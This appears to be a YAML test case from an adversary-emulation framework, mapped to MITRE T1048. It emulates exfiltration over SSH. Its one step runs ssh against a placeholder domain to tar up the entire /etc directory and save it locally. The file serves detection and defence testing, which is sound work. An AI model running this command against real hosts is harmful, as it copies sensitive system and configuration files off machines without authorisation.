api_version: "2.0"
name: Exfiltration Over Alternative Protocol - SSH
description: |
    Input a domain and test Exfiltration over SSH

    Remote to Local

    Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
args:
    - name: domain
      type: string
      default: target.example.com
uuid: f6786cc8-beda-4915-a4d6-ac2f193bb988
mitre:
    tactics:
        - 'TA0010: Exfiltration'
    techniques:
        - 'T1048: Exfiltration Over Alternative Protocol'
requirements:
    platforms:
        - os: darwin
        - os: linux
steps:
    - name: exfiltration-over-alternative-protocol---ssh
      inline: |
        ssh {{.Args.domain}} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
      executor: sh
      cleanup:
        inline: ""
        executor: sh
